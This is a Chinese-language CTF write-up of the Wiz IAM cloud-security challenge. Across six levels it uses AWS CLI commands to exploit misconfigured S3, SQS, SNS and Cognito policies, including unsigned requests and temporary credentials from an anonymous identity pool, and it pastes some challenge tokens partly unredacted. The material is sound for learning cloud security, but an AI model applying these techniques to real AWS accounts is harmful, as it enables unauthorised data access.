---
title: "WIZ IAM挑战赛wp"
date: "2024-01-27"
category: "云安全"
layout: prose
published: true
---

# WIZ IAM挑战赛wp

## 前言

aws关于云安全的一个挑战赛，学的时候一直查官方文档，确实有的不好找。收获还是蛮多的

aws cil文档比概念文档好用（流汗了

### 1. Buckets of Fun

直接是一个bucket的策略

```jsx
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}

```
“Action”: “s3:GetObject”,可以看对象

“Resource”: “arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*“给了桶子的url

拼接一下

[https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com](https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/)

凭借第一个对象路由即可

[https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt](https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt)

```jsx
{wiz:exposed-storage-risky-as-usual}

```

### 2.Google~~ Analytics

## 描述

我们专门为这一挑战创建了自己的分析系统。我们认为它非常好，我们甚至在这个页面上使用了它。会出什么问题？

## 题解

先看下策略

```jsx
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}

```
Action对应的策略是sqs的权限，看样子是sqs的服务

SQS (Simple Queue Service) 可以用来帮助不同的应用程序之间进行可靠的消息传递，它就像是一个消息中转站，可以把消息从一个地方发送到另一个地方，确保消息的安全送达和处理，让应用程序之间更好地进行通信和协作。

这种直接去看awscil 的文档，给了服务和权限，直接调用功能

命令格式

aws 服务 权限 —参数

receviemessage文档

[https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html](https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html)

queue组成

[https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-queue-message-identifiers.html](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-queue-message-identifiers.html)

根据官方文档，要调用 Receive Message 接口，需要知道 Queue URL，Queue URL 的主要构成部分就是 Account ID 和 Queue，在题目的 Policy 中给出了 Account ID 和 Queue 的值，那么我们就可以构造这个 Queue URL 了，构造后的 Queue URL 为：

```jsx
https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

```
payload

```jsx
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

```

```jsx
{wiz:you-are-at-the-front-of-the-queue}

```

### 3.Enable Push Notifications

**We got a message for you. Can you get it?**

看下策略先

```jsx
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}

```
SNS的一个服务，权利（接口 是订阅 Subscribe

SNS，全称Social Networking Services，即社会性网络服务，专指旨在帮助人们建立社会性网络的互联网应用服务（微博推特）

翻下aws sns cil 文档

[https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html)

```
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol http \
    --notification-endpoint http://4.x.x.x:8888/@tbic.wiz.io

```
本来想找个tbic.wiz.io的邮箱，网上没这个邮箱

但是可以支持http协议，通过访问vps不存在的路由也可以nc接受到

vps

```jsx
{
  "Type" : "SubscriptionConfirmation",
  "MessageId" : "ac9f9577-8903-4db6-b2d5-cebf73d8280c",
  "Token" : "2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.",
  "SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e",
  "Timestamp" : "2024-01-28T04:23:42.112Z",
  "SignatureVersion" : "1",
  "Signature" : "erCk7WH9rWQjUpfBYP03sShjEYcAbbw9nKGbhKqL6IzXED7eK9Mxna5a85uqs5pb8Xnco2sYpm0nimHQ2iH8pSyMddBqU/o103qfz6EaK5Faxy1b1C/GViYspxWnoNEh5Vt0ESrZMuAV/3daUyD8pLPdZb/j/ebMTL2O3WEmjsB1yxDPMS0SgrAdi03t+dBzcEh2vzyBgu7ipy237gE/riBlQ839rglKS/v7jBYOcUGDrBNTWAuJPKyUeFPTpXj9PSrhu3cSZZWKEJyv32sGaI9JI8S1EM2f/DVHkgUscXTSwfyxkTsBCjCyQk1aaStI+4hDx6joMb+eANU/jtAOQA==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem"
}

```
通过验证早期 `Subscribe` 操作发送到端点的令牌来验证端点所有者接收消息的意图。如果令牌有效，则该操作将创建一个新订阅并返回其 Amazon 资源名称 （ARN）。仅当标志设置为“true”时， `AuthenticateOnUnsubscribe` 此调用才需要 AWS 签名。

也就是说 订阅了要确定

```jsx
aws sns confirm-subscription \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --token 2336412f37fb687f5d51e6e2425ba1f2505072a050ca3e9dc5a19f0545bf18f9d1ee82058e3bd04d813bb01baecf3cbb945a154d26f928087114e07b4da9b67f10ba357633c0246b4372c3c28b8724193f882f9c4d067eb6c4a0091b3e0b76158a9d92b092136382ddacc86b94d1a71cbed921324aaf9bbc5732b1d183b53382

```
不知道为啥我要报错没权限

但是可以点链接验证订阅，更方便

```jsx
"SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e"

```
SNS服务器就可以直接发message到vps上了

```jsx
{
  "Type" : "Notification",
  "MessageId" : "f523c1ba-941f-540d-8a32-9f957fb3d6ae",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "{wiz:always-suspect-asterisks}",
  "Timestamp" : "2024-01-28T05:43:08.390Z",
  "SignatureVersion" : "1",
  "Signature" : "m3j7hkum0rs1vOODibixiBXXy9pwZBs/k/IsUO42t9632vld9EPKO1cvLkbtTxV6baAnVGpt/oV3TyURcodKNz2YCwStqSYRUfgnamk1n95F2MuW0p7SMqJAoVVACFRVbiUHfOl4JoFkMe8lxqFfEVsmFf+N9RA2VFOMGOJcs9dyvq5VJMmYNF2hDAhpsPXx52S0AEwAuKhUjiJKsQgZQzyh15EDLkrNk1lXpHYOtKtlQHS+jIxOzwXm4EECMGI5NyrQNFVQzDsYOqndCtaLYQ1wEH7H7usRad9Qc8Oj/Uh6Q9DXFfl3wTuCnDLzoM9aO6NLG3VB/PMg56mjmuqq3A==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem",
  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:0333699d-ae52-4080-a5c9-6fa967c9ae20"
}

```

### 4.Admin only?

We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

策略

```jsx
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}

```
先看下bucket

```jsx
https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com

```

  ![Untitled](img/blog_images/iam%2520ctf/3.png)

access deny 限制admin了

```jsx
 "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"

```
显然这里要绕过admin

就在看ForAllValues:StringLike的方法解释的时候似乎看到了了绕过的方法

[https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys)

  - 
`ForAllValues` – 此限定词测试请求集的每个成员的值是否为条件上下文键集的子集。如果请求中的每个上下文键值均与策略中的至少一个上下文键值匹配，则条件返回 true。如果请求中没有上下文键或者上下文键值解析为空数据集（如空字符串），则也会返回 true。为了防止缺失的上下文键或具有空值的上下文键评估为 true，您可以在策略中包含具有 false 值的 [Null](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html#Conditions_Null) 条件运算符，以检查上下文键是否存在且其值不为空。

**重要**

如果将 `ForAllValues` 与 `Allow` 效果一起使用，请小心谨慎，因为如果请求上下文中意外出现缺失的上下文键或具有空值的上下文键，则策略可能会过于宽松。您可以在策略中包含具有 false 值的 `Null` 条件运算符，以检查上下文键是否存在且其值不为空。有关示例，请参阅 [根据标签键控制访问](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/access_tags.html#access_tags_control-tag-keys)。

如何实现没有上下文键值的请求现实是个问题

找半天也没找到，看wp 说是用 s3api 的`--no-sign-request`

  - 
`-no-sign-request` (boolean)

`--no-sign-request` （布尔值）

Do not sign requests. Credentials will not be loaded if this argument is provided.不要对请求进行签名。如果提供此参数，则不会加载凭据。

```
aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request

```

```jsx
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-r
equest
{
    "Contents": [
        {
            "Key": "files/flag-as-admin.txt",
            "LastModified": "2023-06-07T19:15:43.000Z",
            "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
            "Size": 42,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "files/logo-admin.png",
            "LastModified": "2023-06-08T19:20:01.000Z",
            "ETag": "\"c57e95e6d6c138818bf38daac6216356\"",
            "Size": 81889,
            "StorageClass": "STANDARD"
        }
    ]
}> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request

```
访问即可

```jsx
https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt

```

```jsx
{wiz:principal-arn-is-not-what-you-think}

```
这里不能登录iam用户直接访问，没登录的凭证，只有account id

### 5.Do I know you?

We configured AWS Cognito as our main identity provider. Let’s hope we didn’t make any mistakes.

策略

```jsx
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}

```
看下桶子

```jsx
https://wiz-privatefiles.s3.amazonaws.com

```
还是accessdenied

看下什么是amazon cognito

[https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html](https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html)

Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务

这里主要是要访问aws s3的资源，这里看向身份池的描述

当您想要授权经过身份验证的用户或匿名用户访问您的 AWS 资源时，请设置 Amazon Cognito 身份池。身份池为您的应用程序颁发 AWS 凭证，以便向用户提供资源。您可以使用可信身份提供者（如用户群体或 SAML 2.0 服务）对用户进行身份验证。此身份提供者还可以选择为访客用户颁发凭证。身份池同时使用基于角色和基于属性的访问控制来管理您的用户访问 AWS 资源的授权。

为了补充经过身份验证的身份，您还可以配置一个身份池来授权 AWS 访问，而无需 IdP 身份验证。您可以提供自己的自定义身份验证证明，也可以不提供身份验证。您可以使用[未经身份验证的身份](https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html#enable-or-disable-unauthenticated-identities)向任何请求临时 AWS 凭证的应用程序用户授予此类凭证。身份池还接受声明，并根据您自己的自定义模式，使用[经过开发人员验证的身份](https://docs.aws.amazon.com/cognito/latest/developerguide/developer-authenticated-identities.html)颁发凭证。

申请临时凭证的cil

[https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/)

网站源码有身份池id

```jsx
AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});

```
现在先拿id再拿临时凭证

```jsx
aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

```

```jsx
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee01-c92e-6c7f-81f8a7f406e0

```

```jsx
{
    "IdentityId": "us-east-1:157d6171-ee01-c92e-6c7f-81f8a7f406e0",
    "Credentials": {
        "AccessKeyId": "REDACTED_CTF_CREDENTIAL",
        "SecretKey": "REDACTED_CTF_CREDENTIAL",
        "SessionToken": "REDACTED_CTF_CREDENTIAL",
        "Expiration": 1706440272.0
    }
}

```
然后，配置该身份凭证：

```jsx
aws configure set aws_access_key_id REDACTED_CTF_CREDENTIAL
aws configure set aws_secret_access_key REDACTED_CTF_CREDENTIAL
aws configure set aws_session_token REDACTED_CTF_CREDENTIAL
uL7hSAiEA8KVef3llkmskniu0IoCzQj0u/9jer6lk2NWbaxUEu8Uq0QUI0///////////ARAAGgwwOTIyOTc4NTEzNzQiDPuI/LrzfcR
rHfUjgiqlBR5l9zt9c5NFk5hEvlSwio2KTz1xKGFZowzJ6cRTn7u9xDWQCNsgvWrQIvi/C5zpDZWGD2uVrpCQX9n5u7Uu1qgpR+Wrpgy
hXS9B28lur64xO6AJDse4azO3Rh8aR6Q31F5/qe0zNtTrxm0m3v6wtkYVVNvBKA+KYJpBRvAwz/auRKaS29Rtye/Sjn9jle9yg8tDEb9
WZVA4ORw/P71ueSE0GDN2WaPFoQf2tQr5FMgaNPWQwQgSJC8e7lL+PmASJuHZbnLgpoBRsCes442zzxdrGUAkeEp0bN0BYxgcxQa6Gyo
99hOnqTG8echpSb2KRU56jXqdAxccT/bJIPx9KyvSGlArlgz9mD6zsIuLYztV7o+JFTqgiiHZCeiODqqEl4iH5jxKSUyT2DQUxcI3s+9
Hb6Zxa3VICxx8Y7w31hgjpZXsjKqCI8b796XLzgGLHpeDbJkjsND5wcA7//vGpCXiARwHd1rxY50BjiB5LrdSN4lYkiWeKfJ1bgxMr6F
srAGZYVntiOQC6ZV1WEt4sGqYCH9fYuVH+WFVf5Fjn2M5l/0PKPY5hNLSuNs+dIuAXzYncxjKYHLfNkVpMFvAiEJPm+5gm9dKkySgZtE
Sxre+D97ULhZd4kTQgMiGKFLCLFo34PJzy7ZbELm1GGNGCqjBh4PEq6QnHcJ/ReRNkeTzqNoa/SlKmguLOW2sDo4Nibs8JxExFmwkgjA
NLtlsFpaFHYZWlG7zYpnt5+5fvGPXBad4X8XU8Bp7wVa3gH+kDmGsxkpIJWXCCJaZ0zD343KYQE45vfQApLE2tOYjOjYJ9rr3EdW1M0f
6jEh0rakbSEhVCaAT2POow2bD6e/7g3ckMMy8jycCRM8FY137affweRbOVFT83evrm45yFT9vQHJCjliyMIfD2K0GOt4CyFK2ej6xWxF
axLTZ2AC9i9rAiQpHq2g9M8c1xmqNMWjAMIU4sHBjsBwUOD86/gNAvRMCfRxWjAJNTIVJnc8PMxdzgqmUMilbC2ZmaLeiwWhMFhn10aR
rXcpjZtVxw096YAzgFEAQvus4qqzZGSfl7GEZPbwvj4qZ5cffjGeTKSMBJfWQw2tSW3tC4KSbtEJXHLmg6pXtS12L9QjNSARBuRJ4Pon
QGlbgYDuN8DjJI54OCPzEcBnUlga3RfFd4aDAuRI8t0LLXkZJnkHzdEluoJp7Bji1yR4FwHcWGZ7XJCx7S7GV2PpTI/CHaFs0yDECWo6
defTnb35+6lrCidyuMFhY8MzGc89ggcjjipwiPho2D/YHsT4VlSFQ9xAP99q1vAtHPr0IOqLxQyNf/qUooyDD3DeH5bNeOjC3/Am56Jg
r2b8A9JTlymdSJb0RyG7eD1Ilj7V8lx0v+MxN/vI="

```

```jsx
set AWS_ACCESS_KEY_ID=ASIARK7LBOHXJW73PW7H
set AWS_SECRET_ACCESS_KEY=REDACTED_CTF_CHALLENGE_CREDENTIAL
set AWS_SESSION_TOKEN=REDACTED_CTF_CREDENTIALIQoJb3JpZ2luX2VjEBsaCXVzLWVhc3QtMSJHMEUCIQDBFsvKQUGVZMPKbtcHcnh3GFu53P48qhgnH8R
rlSPNtAIgL8iaIiPp4txzVaMsk3kRkCsJReaWrx25nVj1/KYsojMq0QUI0///////////ARAAGgwwOTIyOTc4NTEzNzQiDHygZIKVYF4
PuLtqtiqlBR1OVVIxB3wfNABfbVJyKRPIiyK8g8gKRyJrF4X17Pr4pSXM6Z2qD5qLM3iN3ixcWBVXhmF6+/GdY0lrViLKflzsl2b4gQS
ff2l0rj/pnxgRgeNXXBZuBePUC+aa1rDGTrN4E3qH6C3ldx6s6jwr4zCxkmqiYRsy6GGosTJiORKpJ472v0MWJUBDNnWgajRZ7+fOGyJ
t7YqaOt57uiZU/2xJgT3sbWjBfJ9W12vsTYSob+gU6FOgS7NlZsd58fSZPPOpheL22SoWBBk6/XMgPwA96lyowJzNrwNcY1iRd0m1K4n
YMNiptcPSa8+aIHKpt6gQ++qMYYUGrMyIAgb/ZNeR17AVaWPsorqW8+0M5N1kIfufOOxJpOXgDuqQNIDwrCvk9paaPtj2W4aCfyOPJdt
fIdy3MeoIK0jYYqdUft+buGVpO+cvRS5lZHQ3blrn2UNjmC0PQ9pwwF0bmAsqVabj2KFzuik2LIlpOMofNhFFXRsPWzNK0VJurU5Mhc5
/VBCj/LODgpNizXI5eUntqRh1Jc6Ster6CHeaHpnUc4tJHo06Cv2Hamc9e+TpBptNzFIstUE0SE5ghBJkWQQHCfL5fbUs2YQmX3Z8rFh
ASlcJIZgZiUkxmNZkEBTtcBChkRmoE4ZGOnKXobb4G85xK+OVfjqZqdRPOKdXVQPBfuKvHq77cGnU3SKhVqDCr7XrmzpcAdDVIKPOevt
dx/rdZCbXfvCURtTCOr92vIAB+ObxsGrjcGrzVU8vC4kW5VECbANaLCUdNCXpea82r3DRBUaz6A15QgfRNgckS/CyPrdBAWci4bKiQfh
35QSz7Did9X0M1x9JSQArQwPdJsbHveH5cM7QQ8qI0NMysIf7rs9exSDBbpVlesJ2u+/4UAWjR2lDQI+7MMDQ2K0GOt4CVtKjlbAsRaR
53LG41eSbXJoxhL/mW4K3nQvsB5fxXStvzJkem5uzSiS2aMfTnNIMeWFC/4wk3vlW2GiexMVKSXS5Ll7hObDG3FpbFfkXfZRnC3GI19/
cnfdYSMU6nKRNjcxAwKU3GAhbbLGxP+1CKWpumS9c3GKs3OYe7yDIxB6BPFYNw4u+9Z3zNfW1Ifz+ohScd08xfh7C6hKvIvLKd9Ol/Ap
eFGa7rl7iEk6FTGC71b7JOn2OZ26IsLs7sS3pDKLztyhtpA6HQSVn9MhnCWNuL5TnYyZqxOvQ/bh3JGUz0BfT3t2hd888TM1ZGPLrWMk
JFzYFVlPuWZyN6qsX1AqgIYyTCC1jGXXYJGOuvpq3AghBQHsT3xaYgoGUPgQ3s1tN07/EhgbuRNvL2StEzBcmIgk5eojTYG8xlwJKxDf
AbzJrePlk6YxOfTiqdoAqqV98wpKHptNIuqfoBvM="

```
注意下session token不能有换行符，不然解析不了

  ![Untitled](img/blog_images/iam%2520ctf/4.png)

ls让后cp下载

```jsx
aws s3 ls s3://wiz-privatefiles
aws s3 cp s3://wiz-privatefiles/flag1.txt 1.txt
cat 1.txt

```

```jsx
{wiz:incognito-is-always-suspicious}

```

### 6. One final push

Anonymous access no more. Let’s see what can you do now.

Now try it with the authenticated role:

*arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role*

策略

```jsx
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}

```
还是看action的cil

[https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html)

这个权限 的作用

为已在移动或 Web 应用程序中使用 Web 标识提供者进行身份验证的用户返回一组临时安全凭证。示例提供商包括 OAuth 2.0 提供商 Login with Amazon 和 Facebook，或任何与 OpenID Connect 兼容的身份提供商，例如 Google 或 Amazon Cognito 联合身份。

简单来说发一个临时的安全凭证

```
  assume-role-with-web-identity
--role-arn <value> 给的有
--role-session-name <value> 随便填
--web-identity-token <value> 需要通过身份池ID token获得

```
先获取身份id

```jsx
aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

```

```jsx
{
    "IdentityId": "us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3"
}

```
再拿id token

```jsx
aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3

```

```jsx
{
    "IdentityId": "us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU
3ZDYxNzEtZWU2Yi1jNTlhLTA1MjgtZWRkY2VhNDVhOWUzIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY
5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF
3cy5jb20iLCJleHAiOjE3MDY0MzkzNTMsImlhdCI6MTcwNjQzODc1M30.fhYrm3lhS61vUd-mALuzKnnsg_yLgqa1X428jBU5CQgN3_r
i0nslvvhrFWFQeZOp_44BBlxOZK_Rdq3uwfO86bOzqzGfwTOQwLqt0EBXd732RVqJ0sQuE9fnN2L9dwaUHn3Jaz1Ki4C_HOx1JNrG284
J2HFcqxSNIQzcYXtVWzviCup3VPRZksmFpaAUh9o9xj1tcWPcXR5yepbAMW252vL1FB95bJDYXv1cRLGt9sEEdx1CnObSBgBb-1I30lE
vssKrdatvtQs8BljhoweypvcmW_LSP772oxgzi5-cGud_NC6RtgFlXKIjfGLvEwTdAcKN9xyydDgmk8XIu2y_7Q"
}

```
最后调用sts assume-role-with-web-identity 生成STS

```jsx
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name muscial --web-identity-token "eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU2Yi1jNTlhLTA1MjgtZWRkY2VhNDVhOWUzIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MDY0MzkzNTMsImlhdCI6MTcwNjQzODc1M30.fhYrm3lhS61vUd-mALuzKnnsg_yLgqa1X428jBU5CQgN3_ri0nslvvhrFWFQeZOp_44BBlxOZK_Rdq3uwfO86bOzqzGfwTOQwLqt0EBXd732RVqJ0sQuE9fnN2L9dwaUHn3Jaz1Ki4C_HOx1JNrG284J2HFcqxSNIQzcYXtVWzviCup3VPRZksmFpaAUh9o9xj1tcWPcXR5yepbAMW252vL1FB95bJDYXv1cRLGt9sEEdx1CnObSBgBb-1I30lEvssKrdatvtQs8BljhoweypvcmW_LSP772oxgzi5-cGud_NC6RtgFlXKIjfGLvEwTdAcKN9xyydDgmk8XIu2y_7Q"

```

```jsx
{
    "Credentials": {
        "AccessKeyId": "REDACTED_CTF_CREDENTIAL",
        "SecretAccessKey": "UaCjY3dt+f7jDj01IYGO9kN1ypKkRUpfpoE5lBGC",
        "SessionToken": "REDACTED_CTF_CREDENTIAL",
        "Expiration": "2024-01-28T11:47:49+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:muscial",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/muscial"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}

```
set时间

```jsx
set AWS_ACCESS_KEY_ID=ASIARK7LBOHXGW5IDE55
set AWS_SECRET_ACCESS_KEY=ASIARK7LBOHXGW5IDE55
set AWS_SESSION_TOKEN=REDACTED_CTF_CREDENTIAL

```

```jsx
aws configure set aws_access_key_id REDACTED_CTF_CREDENTIAL
aws configure set aws_secret_access_key REDACTED_CTF_CREDENTIAL
aws configure set aws_session_token REDACTED_CTF_CREDENTIAL

```

  ![Untitled](img/blog_images/iam%2520ctf/5.png)

```jsx
aws s3api list-objects --bucket wiz-privatefiles-x1000
aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt

```

```jsx
{wiz:open-sesame-or-shell-i-say-openid}

```
